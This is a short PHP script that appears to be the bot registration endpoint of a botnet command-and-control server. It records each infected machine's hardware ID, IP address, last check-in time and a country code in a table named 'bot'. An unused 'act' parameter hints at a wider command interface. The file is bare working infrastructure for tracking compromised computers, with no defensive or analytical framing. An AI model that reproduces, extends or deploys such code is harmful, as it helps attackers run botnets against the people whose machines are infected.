<?php
include("config.php");
error_reporting(0);

	 $hwid = mysql_real_escape_string($_GET['hwid']);
     $d = date('Y/d/m h:i:s a', time());
     $action = $_GET['act'];
	 
	 
	 $sql_std = "SELECT * FROM `bot` where HWID='$hwid'";
	 $query_std = mysql_query($sql_std);
	 $count_std = mysql_num_rows($query_std);
	 
	 if(isset($hwid)){
		 if($count_std == 0){
			 
	/* 		$loc = json_decode(file_get_contents('http://freegeoip.net/json/'.$_SERVER['REMOTE_ADDR']), true);
			$c = $loc['country_code'];
			 */
			 $c = "LY";
			mysql_query("INSERT INTO `bot` SET `IP`='".$_SERVER['REMOTE_ADDR']."', `HWID`='$hwid', `Date_Time`='$d', `Country`='$c'");

			
			
		 }else{
			 
			mysql_query("UPDATE `bot` SET `Date_Time`='$d' WHERE `HWID`='$hwid'"); 
			 
		 }
	 }




















?>